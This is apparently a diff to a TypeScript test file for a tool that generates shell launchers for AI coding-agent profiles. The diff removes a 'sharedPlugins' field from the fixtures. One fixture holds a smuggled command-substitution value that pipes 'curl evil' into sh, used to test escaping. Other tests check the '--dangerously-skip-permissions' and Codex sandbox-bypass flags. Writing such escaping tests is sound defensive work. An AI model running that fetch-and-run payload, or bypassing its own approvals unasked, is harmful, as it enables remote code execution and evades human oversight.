@@ -6,10 +6,10 @@ import type { Manifest } from '../src/manifest.js'
 const m: Manifest = {
   version: 1, hub: null,
   profiles: [
-    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, settingsEnv: {}, skipPermissions: false, sharedSessions: false, sharedPlugins: false, links: {}, mcp: [] },
+    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [] },
     { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env',
       env: { ANTHROPIC_AUTH_TOKEN: 'secret://z-token', ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic' },
-      settingsEnv: {}, skipPermissions: false, sharedSessions: false, sharedPlugins: false, links: {}, mcp: [] },
+      settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [] },
   ],
   mcpServers: {},
 }
@@ -39,7 +39,7 @@ describe('renderRcBlock', () => {
     const evil: Manifest = {
       version: 1, hub: null,
       profiles: [{ name: 'x', dir: '{home}/.claude-x', launcher: 'cl-x', auth: 'env',
-        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, settingsEnv: {}, skipPermissions: false, sharedSessions: false, sharedPlugins: false, links: {}, mcp: [] }],
+        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [] }],
       mcpServers: {},
     }
     const posix = renderRcBlock(evil, mac)
@@ -52,7 +52,7 @@ describe('renderRcBlock', () => {
 
   it('renders --dangerously-skip-permissions before args when skipPermissions is set (posix)', () => {
     const m: Manifest = { version: 1, hub: null, mcpServers: {}, profiles: [
-      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, sharedPlugins: false },
+      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false },
     ] }
     const block = renderRcBlock(m, mac)
     expect(block).toContain('claude --dangerously-skip-permissions "$@"')
@@ -60,7 +60,7 @@ describe('renderRcBlock', () => {
 
   it('omits the flag when skipPermissions is false (posix)', () => {
     const m: Manifest = { version: 1, hub: null, mcpServers: {}, profiles: [
-      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: false, sharedSessions: false, sharedPlugins: false },
+      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: false, sharedSessions: false },
     ] }
     const block = renderRcBlock(m, mac)
     expect(block).toContain('claude "$@"')
@@ -69,14 +69,14 @@ describe('renderRcBlock', () => {
 
   it('renders the flag for pwsh (win32)', () => {
     const m: Manifest = { version: 1, hub: null, mcpServers: {}, profiles: [
-      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, sharedPlugins: false },
+      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false },
     ] }
     const block = renderRcBlock(m, win)
     expect(block).toContain('claude --dangerously-skip-permissions @args')
   })
   it('renders Codex launchers with CODEX_HOME and Codex bypass flag', () => {
     const codex: Manifest = { version: 1, hub: null, mcpServers: {}, profiles: [
-      { agent: 'codex', name: 'codex-work', dir: '{home}/.codex-work', launcher: 'cx-work', auth: 'oauth', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, sharedPlugins: false },
+      { agent: 'codex', name: 'codex-work', dir: '{home}/.codex-work', launcher: 'cx-work', auth: 'oauth', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false },
     ] }
     const block = renderRcBlock(codex, mac)
     expect(block).toContain('CODEX_HOME="$HOME/.codex-work" codex --dangerously-bypass-approvals-and-sandbox "$@"')
